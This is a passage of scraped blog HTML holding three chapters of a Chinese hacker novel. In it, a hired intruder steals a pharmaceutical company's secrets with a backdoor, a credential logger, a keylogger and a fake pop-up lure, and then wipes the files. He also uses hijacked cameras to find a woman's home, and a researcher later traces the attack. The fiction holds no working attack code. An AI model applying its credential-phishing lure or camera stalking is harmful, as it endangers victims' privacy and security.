&lt;p&gt;在右侧的显示器中，显示着王梓最近刚刚开发完成的天眼系统。这个系统控制了成千上万的摄像头网络，借着这次暴露出来的漏洞，可以控制许许多多企业、工厂的内部摄像头。王梓可以随时查看分布在全球的摄像头，这个系统将可以很好的帮助他定位他想要入侵的目标关联的人。王梓看着这个完成不久的系统，他突然想试试效果。突然，想起今天遇到的帅气女孩。于是，他在天眼的定位系统中输入了小区名字，切换到了摄像头的控制界面，查看这个时间段的小区摄像头，通过不断的切换摄像头，最终确认女孩的门牌号码。王梓在空中打了一个响指，喊了句”bingo“。&lt;/p&gt;
&lt;h2 id=&#34;爆发&#34;&gt;爆发&lt;/h2&gt;
&lt;p&gt;同一时刻，在网络中的一个角落里，从事者勒索病毒的黑产团伙，正在开始利用NSA的工具，改编成了计算机病毒，开始对全球进行传播，一场网络灾难正在逼近。还沉浸在自我世界中的人们，还没有一点点的感觉。学生们忙着论文；相关机构的电脑正在运行着；小白则刚刚下班回到家中，躺在床上休息。&lt;/p&gt;
&lt;p&gt;从遥远的大洋彼岸，一串串0和1的数字以光的速度飞向地球上的6大洲（南极洲没有算进去，所以为6大洲）。东方昊天还在弄着自己的论文，突然他的电脑开始增加了一些怪异的文件，过了几秒钟后，他的一些文件开始减少，又过了几秒钟，他的屏幕中心显示了一个红色窗口，上面有勒索的文字和比特币地址，左侧的时间开始计时，东方那以为只是恶作剧，没注意，点击了x关闭窗口，可是窗口过了一秒又出现了，又重试了几次，发现还是不行，就在此刻，在他旁边的几位同学也出现了一样的情况。而在中国其他学校也出现类似的情况，许多人看着屏幕上那关不掉的窗口，无奈。&lt;/p&gt;
&lt;p&gt;Image&lt;/p&gt;
&lt;p&gt;就在短短的一天时间里，这个病毒就感染了全球数十个国家的计算机，侵入了无数的重要机构和学校。其中包括银行，公安机关，政府部门，数十所高校，医院等。系统的瘫痪，使得这些机构的正常业务受到影响，无法进行相应的处理。大家都在紧急处理这个事情，一些领导则开始到处找人寻找能够支付比特币的人。这个名为WannaCry的病毒，正如他的名字一样，让许多人想哭。&lt;/p&gt;
&lt;p&gt;就在各大网络安全公司紧急处理这件事情的时候，大家都在对此病毒议论纷纷的时刻，一名外国年轻人，发现了病毒的一个隐秘开关，就是一长串看似无规则的域名，这个年轻人注册了该域名，使得病毒的传播开始放缓，给了许多人做好防护措施的时间。他是一名安全研究人员，他成了这个网络乱世中耀眼的英雄。而微软也发布了公告，紧急的推出了早已经停止更新的windows xp和windows server2003的系统补丁。&lt;/p&gt;
&lt;p&gt;朋友圈，微博，微信群，qq群等均被这个红色窗口的病毒所刷爆。面对这场网络灾难，有许多在前线与之对抗；当然也有许多闲的蛋疼的网友把病毒进行各种ps；还有的小孩子为了跟父母要零花钱以中病毒的名字跟父母要钱。奇护公司的人在电脑前紧密的分析着病毒，一行行的汇编代码从它们的眼镜片中映射出来。而大屏幕上显示着病毒全球被感染的情况。不断的有新的进展输出，病毒的防御工具，文件恢复工具，病毒的专杀程序。当然病毒的制造者们也没有闲着，对病毒不断进行修改，并放出。攻与防愈加激烈。&lt;/p&gt;
&lt;p&gt;因为这个病毒的突然袭来，对于王梓入侵的事情，则早被警察们放到一边。王梓则在这个网络的背后，默默的观察着这一切。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;h2 id=&#34;相关事件&#34;&gt;相关事件：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;公安部破获50亿数据盗窃团伙案，共抓捕96人。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;维基解密公布美国CIA工具包和文档。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“影子经纪人”公布NSA组织黑客工具包，其中包含入侵银行的文档，windows漏洞攻击工具，以及NSA远程控制工具。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;天眼系统的灵感来自电影速度与激情8。理论上是可以实现的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">原创小说《杀手》第四章 网络灾难</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Three/"" data-c="
          &lt;p&gt;Jack来到了天成网络公司的总部，他身穿一身白色衬衫，一条浅蓝色牛仔裤，整个人看上去非常的精神。到达后公司的人热情招待，但是Jack则直接拒绝了，要求立刻就要开始进行分析追踪。因为这对他来说，是一次有趣的挑战。他有些迫不及待是一个什么样的人干了这件事情。&lt;/p&gt;
&lt;p&gt;首先询问了系统部人员的一些网络架构。以及现在企业内部所做的全防护措施。接着他有询问了更加具体的信息，其中包含了文件保存的位置，以及发生的时间点等。通过快速的对话沟通，Jack了解了对方的网络一个大概的安全状况。&lt;/p&gt;
&lt;p&gt;他跟对方的技术负责人说道：“你们现在的网络情况相对来说做的非常不错，你们目前忽略了公司员工的安全意识，以及目前网络并没有对外流出数据进行一个很好的监控。这使的黑客有机可乘。”&lt;/p&gt;
&lt;p&gt;“哎呦，您真的是太专业的，我们已经把我们所了解到的都利用上了，同时我们也经常找安全团队来对我们的系统进行入侵测试。然而他们并没有发现什么内容。发现的我们也都已经修复了。”系统部负责人拍了下大腿，高兴的对Jack说道。因为他似乎看到了希望，看到了眼前这个人可以查出入侵者，这样他也就不会被炒鱿鱼了。&lt;/p&gt;
&lt;p&gt;“如果真的如你说的这般，这次的攻击者也是花了很大的代价来入侵你们，看来对方是真的下了血本，想置你们公司于死地啊。”放心，这次我一定要帮助你们找到真凶。他更加的想要知道究竟是什么样人了。&lt;/p&gt;
&lt;p&gt;“能有您的加入，那真的是太好了，有什么需要帮助的，需要我们提供的，您就尽管说。我们一定全力配合您。”&lt;/p&gt;
&lt;p&gt;“好，那我们废话不多说，开始吧。”&lt;/p&gt;
&lt;p&gt;“好，小王，给Jack倒一杯咖啡。”&lt;/p&gt;
&lt;p&gt;说着Jack找了个空位置，很不客气的就坐下了，从他的背包中拿出了自己的thinkpad笔记本。上面有一个blackhat的贴纸，看上去非常的酷。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;此时的Jack像一个侠客，而他的笔记本就像是一把宝剑。在电脑开机的那一刻也就是宝剑出鞘的那一刻。而接下来的，就是他与杀手的一场较量。同时这也是网络中白帽子与黑帽子的一次较量。其实，他们都有共同点，那就是对于自由的渴望，以及对困难事物的突破。在寻求突破的过程中获得一步一步走向自由，道突破成功后的成就感与喜悦。&lt;/p&gt;
&lt;p&gt;Jack以一名攻击者的角度去进行思考，首先他进一步对刚才系统部负责人说的系统架构进行进一步的了解。他输入了www.nosec.org这个网站，并登录了他的账户，他点开了资产检索，输入了天成网络的网站域名，他轻轻点了下鼠标，电脑上就开始不断的显示出关于天成网络的ip地址，以及一些使用的系统信息、以及天成网络员工的信息。&lt;/p&gt;
&lt;p&gt;图片 1.png&lt;/p&gt;
&lt;p&gt;nosec网站为真实的。当然图中的目标是假的&lt;/p&gt;
&lt;p&gt;当然，使用这个系统中获取到的信息，不是全部的。他获取不到天成网络的内部网络（外部无法直接访问的系统）。Jack拿起旁边的咖啡，喝了一口又放下。因为通过之前的了解，他像系统部的人员索要了zabbix系统的账号和密码。查看内部的网络系统情况。&lt;/p&gt;
&lt;p&gt;Jack快速浏览了这些信息之后，凭借他多年的经验。他迅速的在脑海中圈出了几处重点系统。并对系统部的负责人说：“你们把现在oa系统，crm系统，vpn系统，产品管理系统这几个系统的日志，按照事故发生时间段提取出来，给我一份。”&lt;/p&gt;
&lt;p&gt;“好，小王，去把Jack刚才说的内容倒出来，并且拷贝给Jack看。”此时系统部的负责人也不管一些公司的规定了，在他看来，现在找到攻击者才是重中之重。&lt;/p&gt;
&lt;p&gt;“好的，马上”小王迅速应到。&lt;/p&gt;
&lt;p&gt;“Jack，你看现在最有可能是哪个系统呢？”&lt;/p&gt;
&lt;p&gt;“这个我不能乱说，要根据实际的分析之后才能得出结论。”&lt;/p&gt;
&lt;p&gt;“嗯嗯，懂的，我们日志准备好后，就会给您。”&lt;/p&gt;
&lt;p&gt;过了大概20分钟后&lt;/p&gt;
&lt;p&gt;“数据已经导出完毕。都在这里了。”小王对着Jack说到。&lt;/p&gt;
&lt;p&gt;Jack接过他手中的移动硬盘，连入自己的电脑。他运行了星图对，只见电脑中弹出了一个黑色窗口，一行行的绿色字符流过。等待了大概2、3分钟。程序执行完毕。并显示出了一份报告。&lt;/p&gt;
&lt;p&gt;Jack眼睛开始盯着屏幕，对着屏幕上的报告进行阅读，看着看着，他的眉头就皱的越来越紧。因为他发现，这些系统中没有攻击日志。这让他很是意外。一来可能是他判断错误，二来可能攻击者在临走前已经把这些日志清理掉了。Jack又去查看了原始的日志文件，他发现，有一段时间的日志是没有的。这使得他确认，攻击者把攻击日志清理掉了。看来这次的对手是一个身经百战的老手。而Jack也越来越兴奋起来。&lt;/p&gt;
&lt;p&gt;2.png&lt;/p&gt;
&lt;p&gt;“这次的入侵者经验丰富，他已经删除掉了。你们的日志有每天进行备份么？”&lt;/p&gt;
&lt;p&gt;“有的有的，小王，快去把备份的数据调出来。”&lt;/p&gt;
&lt;p&gt;“好的，马上。”&lt;/p&gt;
&lt;p&gt;又过了大概20分钟&lt;/p&gt;
&lt;p&gt;“好了～，都在硬盘里了。”&lt;/p&gt;
&lt;p&gt;Jack接过硬盘，首先他将这份备份的文件和最开始的文件进行了比较，然而让他意想不到的是，两个文件大小竟然一样。他打开了最新的文件，一看，突然他瞪大了双眼，竟然跟刚才看的一模一样。这使他大吃一惊。&lt;/p&gt;
&lt;p&gt;“你确定你这一份是从备份的服务器上导出的。”Jack为了确定是不是小王搞错了。&lt;/p&gt;
&lt;p&gt;“确定，非常确定。我们的服务器都贴着标签的，而且两台服务器离的很远，绝对不会搞错的。”&lt;/p&gt;
&lt;p&gt;Jack陷入了思考。这次的确有些棘手，对方不仅经验丰富，手法老道，而且做事不留痕迹。&lt;/p&gt;
&lt;p&gt;Jack发现从系统日志下手是不行了，看来必须通过其它的入口来寻找黑客的踪迹。&lt;/p&gt;
&lt;p&gt;“我需要你们被窃取的机密文件的电脑。我要到那台电脑中去寻找相关线索“. Jack对系统部的人说道。&lt;/p&gt;
&lt;p&gt;“被窃取的资料，客户的信息放在销售部，市场部的相应负责人手中，而制药配方，只有我们的总裁那里才有。这些我们都需要跟领导申请，批准后才可以查。”&lt;/p&gt;
&lt;p&gt;“好，那你们尽快吧。目前的通过日志分析这条路是行不通了。”&lt;/p&gt;
&lt;p&gt;“好的，我们这就去跟领导提。您等等”。&lt;/p&gt;
&lt;p&gt;Jack需要从相关的系统寻找黑客遗漏的蛛丝马迹。那么黑客盗取文件，销毁文件就必须进入过这些电脑系统，一旦登陆这些系统，就会留下系统日志。日志文件中都记录了ip地址。他一边等待着系统部的申请，一边还在思考着如何去追查黑客。&lt;/p&gt;
&lt;p&gt;铛铛铛，系统部负责人敲了总裁的门。&lt;/p&gt;
&lt;p&gt;“总裁，我们系统部这边请来的Jack需要分析您和市场部、销售部总监的计算机。通过你们的电脑寻找线索。”&lt;/p&gt;
&lt;p&gt;“这事批准了。你们把我电脑拿过去吧。另外我会电话跟市场部，销售部的人沟通，你们等电话去取电脑就可以了。”&lt;/p&gt;
&lt;p&gt;“另外，一定要找到攻击者，将他们绳之以法。赔偿我们的损失。而且速度一定要快，晚了，人都不知道跑哪里去了。”天成网络总裁继续补充道。&lt;/p&gt;
&lt;p&gt;“好的，那我这就拿过去”。说完，系统部负责人，便直接上去拆总裁的电脑，并叫了一个人过来一起搬走了。&lt;/p&gt;
&lt;p&gt;系统部负责人把电脑放到Jack面前，并组装好，并说道：“您要的电脑给您拿过来了”。&lt;/p&gt;
&lt;p&gt;“另外啊，还请您这次务必查出攻击者。真得好好惩罚一下他们这群该死的黑客。”系统部负责人再次的向Jack恳求道。&lt;/p&gt;
&lt;p&gt;“你放这里吧，我会尽全力找出攻击者的。”&lt;/p&gt;
&lt;p&gt;“那就拜托您了。有什么需要的尽管吩咐。”&lt;/p&gt;
&lt;p&gt;Jack一点也没在听系统部负责人说什么，他开启了电脑，他想马上就找到攻击者。过了一会，屏幕上显示了系统的登陆界面。Jack回过头，对着系统负责人说：“密码”！&lt;/p&gt;
&lt;p&gt;系统部负责人连忙答应，并输入了密码。&lt;/p&gt;
&lt;p&gt;登入进了系统，Jack二话不说，直接打开了系统中的事件查看器，然而结果跟他预想的一样，登陆信息也都被删除掉了。&lt;/p&gt;
&lt;p&gt;接下来，他又开启了系统的命令提示符。他在窗口中输入了netstat -ano命令，敲入回车键后，一行行字符串显示出来。同时他又打开了任务管理器。他想通过查看系统中的网络连接情况来确认对方的木马是否还在系统当中。然而这一切的一切，依然没有任何的结果。因为系统中一切运行正常。&lt;/p&gt;
&lt;p&gt;在此时，市场部的电脑和销售部的电脑也送过来了，他使用同样的思路和方法来进行查看，但是结果也都是如此。&lt;/p&gt;
&lt;p&gt;Jack坐在桌子前，再次陷入了沉思，难道就黑客真的做的这么彻底？一点痕迹都不留下？&lt;/p&gt;
&lt;p&gt;此时Jack的手机亮了，他下意识的看了一眼，是一封推广邮件。而就在看到的那一瞬间，他突然眼前一亮，他立马跟系统部的负责人说：“把你们最近一个月的所有员工邮件给找出来，同时把附件导出。我需要检查你们的邮件内容。”&lt;/p&gt;
&lt;p&gt;Jack想攻击者通过外部的系统很难进入内部网络，所以很有可能通过邮件的方式来攻击内部员工。&lt;/p&gt;
&lt;p&gt;“好的，稍等。”&lt;/p&gt;
&lt;p&gt;大概过了2个小时后，系统部的人拿着硬盘过来了，接入了Jack的电脑。Jack把邮件的所有信息都导入了mysql数据库中。他的手在键盘上快速的敲击着，此时四周安静起来，彷佛此时的世界只有他一个人。因为胜利可能就在眼前。&lt;/p&gt;
&lt;p&gt;Jack开始查询所有的公司以外的人员，以及伪造的邮件信息。时间在一分一秒的过去，Jack从数千封的邮件中过滤着，他的眼睛一直盯着屏幕。也不知道过了多久。就连系统部小王给他倒的咖啡，他也一点没有注意到。而在他的手再次放到键盘上开始敲打的时候，不小心打翻了手边的咖啡。而Jack也没有去管，继续查找着，因为他发现通过外部的邮件跟本没有任何有价值的信息。这时他开始怀疑，莫非攻击者也把邮件记录删除掉了。尽管抱着怀疑的态度，他还是不想就此放弃。他开始寻找内部员工之间的邮件，因为也有可能公司的这次事情就是公司的内鬼干的。洒掉的咖啡从倒下的杯子中缓缓的淌出来，淌到了桌边。同时也浸湿了Jack的袖口。而Jack多次的键盘敲击，使得的袖口上的咖啡也沾到了电脑上。而此时的Jack对此毫无察觉。&lt;/p&gt;
&lt;p&gt;接下来Jack通过扫描邮件系统中的附件文件，他有了新的发现。有一个相同的木马文件，是由一个销售人员发送给其他的几个人的。&lt;/p&gt;
&lt;p&gt;而此时的Jack彷佛从他的世界苏醒过来，这时他才意识到撒的咖啡。连忙拿了几张纸将桌子擦干净。&lt;/p&gt;
&lt;p&gt;他将邮件系统的木马文件放入到了虚拟机中，并运行起来。他通过虚拟机中的运行情况。确定了木马连接的ip地址。他对ip地址进行查询，地理位置显示是韩国。当然，他想也能够想到一个老手，怎么可能用自己的真实ip地址呢。&lt;/p&gt;
&lt;p&gt;“有进展了，我发现根本原因是你们的员工发送的邮件中有木马，并且他们运行了该款木马。你们可以对发送邮件的这个人进行调查，从邮件发件人的地址来看，他也是你们公司的。另外，木马的控制端ip地址为韩国的一个ip，攻击者使用了跳板服务器。不过目前的这些，足够你们去报案调查的了。你们发送邮件的那个人就是最直接的证据。”Jack给了系统部负责人答案。&lt;/p&gt;
&lt;p&gt;“真的太好了。您真的是太厉害了，专业。真的是帮我们大忙了。这样，这件事情过后，我一定好好的请您。我这就写一封邮件汇报给我们总裁。”&lt;/p&gt;
&lt;p&gt;“我要先回去休息一下了。”Jack看了下手中的表。“wow，原来我已经研究了一天一夜了啊。”&lt;/p&gt;
&lt;p&gt;“是啊，您真的太投入了。我们也没好意思打扰您。您快去休息吧。我这就安排人送你去酒店。”&lt;/p&gt;
&lt;p&gt;Jack拖着疲惫的身躯走了，而系统部负责人则脸上露出了胜利的微笑。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;p&gt;注：由于对制药公司不了解，所以，以后的都会以天成网络公司来进行描述。&lt;/p&gt;
&lt;p&gt;##黑客兵器谱&lt;/p&gt;
&lt;p&gt;星图：全名360星图，360旗下一款日志分析工具。&lt;/p&gt;
&lt;h2 id=&#34;术语解释&#34;&gt;术语解释&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;注解1：zabbix（音同zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注解2：shell，在计算机科学中，Shell俗称壳（用来区别于核），是指“提供使用者使用界面”的软件，通俗的讲就是在电脑中一个可以与我们进行交互的命令控制界面，我们可以输入系统中存在的命令来控制计算机执行我们想要的操作，webshell，就是网站的shell程序，可以控制网站中的文件、执行命令等操作的程序&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;小知识&#34;&gt;小知识&lt;/h2&gt;
&lt;p&gt;查看系统网络连接情况：点击开始－》运行（或者按win＋r键），然后输入cmd，打开命令提示符，在命令提示符中国年输入netstat -ano，可以查看端口连接情况，同时也会显示进程的pid值。在打开任务管理器（ctrl＋alt＋del）。其中在查看选项中选中pid。这里的pid跟刚才命令行中的pid值对应就可以看出是哪个进程连接了哪里的网络。当然在命令行下也可以使用tasklist查看进行和pid等信息。对于网络连接的查看有一款图形化的工具tcpview可以直接查看。&lt;/p&gt;
">原创小说《杀手》第三章 追踪</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Two/"" data-c="
          &lt;p&gt;&lt;strong&gt;生命的短暂犹如露珠消散，人们在奔波中探寻答案。命运如同大海起伏不定，键盘在黑夜中吟唱悲歌。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;寂静的黑夜，人们的呼声飘荡在夜空中。&lt;/p&gt;
&lt;p&gt;北京市朝阳区酒仙桥路阳光上东小区，在某间屋子里，一个人人正在神情专注的盯着电脑，不断的发出鼠标点击和敲击键盘的噼啪声，那声音清脆极了，犹如美妙的音符一般。&lt;/p&gt;
&lt;p&gt;王梓正在探寻对方的公司内部网络，寻找着重要信息。看似平静的夜晚，而危险正在通过网络悄无声息的靠近。在未来的一个月内不知道会有多少人面临着失业，抑或者有人因此而自杀，也不知道多少病人因为药厂不能提供一些药物而加重病情，甚至死去。人们无法预测自己的未来和控制未来。杀手掌握着别人的未来，可是对于杀手抑或者网络杀手来说，他们自己的未来，也同样掌握在别人的手里。&lt;/p&gt;
&lt;p&gt;人们还不知道危险就在自己的身边，人的生命有时候就是这样的脆弱。人们的命运都掌握在别人手里，在这大千世界面前我们都是弱者。即使强者也只是暂时的，不断变换着的。&lt;/p&gt;
&lt;p&gt;王梓通过之前的几台员工电脑，很顺利的便控制了对方的crm（客户关系管理系统）、文件备份管理系统。此时的他正在准备获取到公司内部网络的最高管理权限（域控制权限）。黑色窗口，白色字符，不断闪现的流动的一串串字符。每一次的键盘敲击，都是在与目标靠近。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;王梓通过获取到的用户名列表，确认了管理员的账户名。接下来，他制造了一个陷阱，在已经控制的crm系统中留下了后门。该后门在网络管理员登陆对方到crm的系统远程连接时，会向网络管理者的电脑中植入远程控制程序，同时还会记录管理员登陆账户名和密码（类似gina木马功能）。做完这个操作后，王梓的脸上露出了微笑。一张清秀的脸，没有戴眼镜的他竟然有些帅气。&lt;/p&gt;
&lt;p&gt;第二天早上，王梓公司内&lt;/p&gt;
&lt;p&gt;如往常般，小楠亲切地跟王梓打招呼，王梓傻傻的笑笑。然后略带羞涩的对小楠说：“那个，那个什么，我给你买了早餐，放在你的桌子上了。”&lt;/p&gt;
&lt;p&gt;小楠很是意外，这个平时话不多，不怎么与别人交流的人，竟然给她买了早餐。&lt;/p&gt;
&lt;p&gt;“说你是不是有什么事请我帮忙？”&lt;/p&gt;
&lt;p&gt;“没，没有”，王梓有点结巴的答道&lt;/p&gt;
&lt;p&gt;“真的没有？”这次，小楠特意加重了语气。&lt;/p&gt;
&lt;p&gt;“没有～”，王梓则挠挠自己的后脑勺回答。&lt;/p&gt;
&lt;p&gt;“那你怎么突然给我买早餐了？莫非是你也要追我？”&lt;/p&gt;
&lt;p&gt;“我我……我是看你每天都不吃早餐，怕你胃不好，就就，就给你买了”。听到小楠那么问他，王梓即使没有追她的想法，也立刻脸红了起来。&lt;/p&gt;
&lt;p&gt;“哦，那谢谢”。&lt;/p&gt;
&lt;p&gt;小楠回到座位上，看到了一份肯德基早餐。有粥，有煎蛋，还有一根油条。小楠心里是暖暖的，表面上硬装做正常样，然后动手吃起来。&lt;/p&gt;
&lt;p&gt;王梓看到小楠开始吃起来了，他则偷偷的拿着自己的macbook笔记本，跑到厕所里，先是左看看，右看看，确认无人后，找了间进去，坐在马桶上。打开电脑，连入自己家里的电脑。利用之前控制的天成制药的几台系统，偷偷的用他们的电脑访问了crm系统存在的一处DoS问题，来让对方的crm系统异常，这样系统管理员就会登陆系统去处理。此时的王梓，还经常听外面是否有人。幸好，在这个过程中都没有人进来。&lt;/p&gt;
&lt;p&gt;而此时，在天成制药企业办公楼内，一名市场人员，首先发现发现crm系统打不开了。他拨通了系统部电话&lt;/p&gt;
&lt;p&gt;“系统部么，我们这边的crm系统登陆不进去了，你们赶紧看看吧。”&lt;/p&gt;
&lt;p&gt;“进不去？是什么样子的？”&lt;/p&gt;
&lt;p&gt;“一直在加载状态，系统显示一片空白。”&lt;/p&gt;
&lt;p&gt;“好，马上处理。”&lt;/p&gt;
&lt;p&gt;天成制药的系统部小王接到了这个处理任务，由于他刚来不久，所以要好好表现，一听到有紧急事情处理，迅速的就进行处理。&lt;/p&gt;
&lt;p&gt;结果很顺利，对方的管理员在5分钟内就连入了系统。并重启了crm系统（不久后，该管理员联系了软件开发商，并修复了这个DoS问题）。而王梓也很顺利的控制了这名网络管理员的电脑和密码。王梓合上电脑，回到座位上。正常工作起来。&lt;/p&gt;
&lt;p&gt;王梓监控了管理员的电脑，并且在该名管理员电脑中找到了服务器，以及网络架构设计文档，以及对电脑资产的详细说明。这一切都在王梓的计划掌控之内，非常的顺利。王梓已经获取到了整个公司的管理权限（域控）。现在他就像拿到了最高级别的身份验证卡，可以任意的进入任何区域不受限制。&lt;/p&gt;
&lt;p&gt;王梓通过oa系统中的组织架构，盯上了几位公司的高层电脑，以及公司管理机密信息的人。他进入这些系统，翻看这些系统中的文件，寻找着他想要的文件。终于，王梓在该公司的董事长电脑中发现了一份加密的文档，这个文档就是对方想要的。王梓看了下，加密算法比较复杂。接下来，他在这台电脑中植入了键盘记录的程序。但是接下来，如何让对方输入密码呢？王梓坐在电脑前，闭着眼睛，双手合十，两只拇指架在下巴上，两只食指拄在眉宇之间。他陷入了思考中。&lt;/p&gt;
&lt;p&gt;突然，他睁开双眼，双手在键盘上输入敲了几十下，接下来，他在对方的电脑设定了一个定时任务，并且把刚刚制作好的文件传到了对方电脑上。&lt;/p&gt;
&lt;p&gt;制作的文件是一个vbs后缀的文件，里面的内容是王梓编写的一行代码&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;p&gt;msgbox(&amp;quot;您系统中的文件xxxx配方.rar可能存在问题，请注意检查！&amp;quot;)&lt;br&gt;
接下来就是漫长的等待了。事情发展的似乎并没有那么顺利，天成制药的董事长在接下来的几天内都出差，所以，王梓并没有得到密码。不过离交货的日子还够，王梓也并不着急。而他现在开始每天给小楠买早餐吃，而小楠也没有说拒绝的话。&lt;/p&gt;
&lt;p&gt;一周后，天成制药的董事长终于回来了，当他看到系统提示的时候，他发现这是一个很重要的文档，这使他担心起来，但是作为多年商场经验的他，还是让他保持冷静，他打开文档，并输入了很长一串的密码。发现没有任何问题后，他松了一口气。而在这操作的后面，他的一长串密码，都已经被记录下来。&lt;/p&gt;
&lt;p&gt;而另外一边的王梓，看到密码后，打了一个响指，并喊了一声耶。他迅速的把文件传回，确认可以打开后，他把源文件在对方电脑中，使用wywz（中文名无影无踪，一款擦除数据的工具）进行了删除。&lt;/p&gt;
&lt;p&gt;王梓将他的文件发送给了客户，并且收取了尾款。他便把所有关于买家的记录和信息删除掉。他从来不愿意跟买家进行多余的对话，包括一些客套话。接下来，他觉得他可以休息一段时间了。&lt;/p&gt;
&lt;p&gt;一个正常的周二夜晚，王梓跟往常下班一样站在公交站等车。此时的北京正是秋天，夏天带着闷热已经离去，而秋天带着风向人们袭来一丝丝凉意。公交车到了，王梓上车后找了一个靠窗的座位坐下。前面是一对情侣，女孩搂着男孩的脖子倚偎在男孩的怀里睡觉，男孩用他的手一下一下拍着女孩。不时的还会转过头看看怀里的女孩，然后满足的笑笑。这温暖的画面，赶走了这秋天的风带来的凉意。&lt;/p&gt;
&lt;p&gt;王梓看向窗外看去，人群中有一个穿着卫衣、牛仔裤，休闲鞋的小伙子正低头一脸认真的盯着手机，这个人是小白，此时他手机上显示的是一篇记大牛写的反追踪黑客的技术文章。小白最近也还在研究那几个异常ip。王梓下班坐车会经常看到小白。只是两个人都不认识。而很快的小白就消失在王梓的视线里，一对手拉着手的情侣正在有说有笑的走着，随着车的行驶更多下班回家的人人进入王梓的视线，说是家，其实大多数不过是临时跟别人一起租来的一个房子，自己拥有一件小小的空间里而已。在这座城市大家都在努力奋斗，为了有一天可以改变自己的命运。&lt;/p&gt;
&lt;p&gt;就在同一时刻的深圳天成制药总部，市场部、研发部、系统部以及公司的高层都在公司里加班。系统部里不断有其他部门的同事、高层等打来电话来询问。&lt;/p&gt;
&lt;p&gt;“你们赶快想办法给我恢复文件，这文件非常重要，你要是不行，趁早给我滚蛋回家。”天成制药公司董事长疾言厉色地责骂系统部的人。&lt;/p&gt;
&lt;p&gt;“是是是，我们正在尝试恢复以及追查攻击者。”接电话的人吓得连忙应到。&lt;/p&gt;
&lt;p&gt;“速度！速度！速度！听明白没有。”董事长很清楚，攻击者可以销毁这些文件，同样也可以把文件给竞争对手，如果部快速找到凶手，那么损失损失将是巨大的。&lt;/p&gt;
&lt;p&gt;“明白！明白！您放心！”&lt;/p&gt;
&lt;p&gt;“有进展第一时间向我汇报。”&lt;/p&gt;
&lt;p&gt;“好！一定！”&lt;/p&gt;
&lt;p&gt;公司的高层也在会议室里讨论着解决办法，解决方案。此时整座公司大楼里是一幅鸡飞狗跳的场景。对于天成制药的绝大多数人来说，注定是一个不眠的夜晚。尽管如此，在第二天，网络上就开始有消息传天成制药公司被黑客入侵，泄漏了客户信息，以及制药的配方文件被销毁。消息一发出，迅速的传遍了整个制药行业，同时也传到了天成制药的投资方合作伙伴，客户那里。他们纷纷打电话到天成制药质问，有些脾气不好的则在咒骂。其实这算好的，更加致命的是天成制药的股票开始迅速下迭，投资方要求撤资。这无疑是在伤口上撒了一把盐，巨痛无比，就算熬过了这个阶段，也可能慢慢的死去。&lt;/p&gt;
&lt;p&gt;天成制药公司高层召开紧急会议。&lt;/p&gt;
&lt;p&gt;董事长一脸愤怒的表情，接着对大家说道：&lt;/p&gt;
&lt;p&gt;”现在公司的状况，大家也都清楚了，我无需多言。公关部快速，不！是立刻，马上给我出一个对外的说明。“&lt;/p&gt;
&lt;p&gt;”还有销售部，市场部，安抚各自负责的区域、客户。“&lt;/p&gt;
&lt;p&gt;”系统部，文件是否能够恢复？攻击者查的如何了？“&lt;/p&gt;
&lt;p&gt;”目前还没有进展。“系统部负责人低着头，并且说话声音很小。&lt;/p&gt;
&lt;p&gt;”我要你们有什么用？你们是干什么吃的？花了那么多的钱，防防不住，查也没查到任何东西，恢复也恢复不了。你们跟猪有什么区别，啊”&lt;/p&gt;
&lt;p&gt;系统部负责人沉默。&lt;/p&gt;
&lt;p&gt;“你们倒是说话啊，平时看你们就没啥成绩，关键时刻啥啥都不行。你们如果自己不行，那就找可以的人啊，重金去找～”&lt;/p&gt;
&lt;p&gt;”董事长，我们为什么不报案？“&lt;/p&gt;
&lt;p&gt;“你是猪脑子啊，我们一报案，外面的传闻不就证实是真的了么？等你查到攻击者在说。”&lt;/p&gt;
&lt;p&gt;“好，我这就去。”&lt;/p&gt;
&lt;p&gt;天成制药很多人都在忙碌着，大家都在一起面对这一场突如其来的危机，同时也在做着各种心理准备，因为他们还不知道是谁在暗地里搞他们，而且还是往死里整。&lt;/p&gt;
&lt;p&gt;天成制药公关部对外宣称，请勿相信外界传闻，天成制药正在研发新产品，公司现在一切正常。同时，系统部的人开始在私底下利用关系网寻找安全圈子里的牛人。&lt;/p&gt;
&lt;p&gt;公关部对外已经得到一些平息，系统部这边也在网络上花了重金找到一名安全界的大牛——Jack，Jack是一家安全平台灰云的为一名安全研究员。同时也是insight labs组织的成员之一。有多起公司被入侵事件，都是由Jack追查到，并且通过黑客技术反黑入攻击者的计算机系统中。帮助警察成功抓住了攻击者。最厉害的一次要属新浪微博的入侵事件了。&lt;/p&gt;
&lt;p&gt;这次他接受了天成制药的邀请，追查黑客。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（未完待续）&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;借鉴&#34;&gt;借鉴：&lt;/h2&gt;
&lt;p&gt;生命短暂犹若露珠消散，人们在奔波中探寻答案。&lt;/p&gt;
&lt;p&gt;运数仿佛大海起伏不定，掌上迷离脉纹回路漫漫。&lt;/p&gt;
&lt;p&gt;长剑在黑夜吟唱悲歌，岁月如斑驳铜镜经年。&lt;/p&gt;
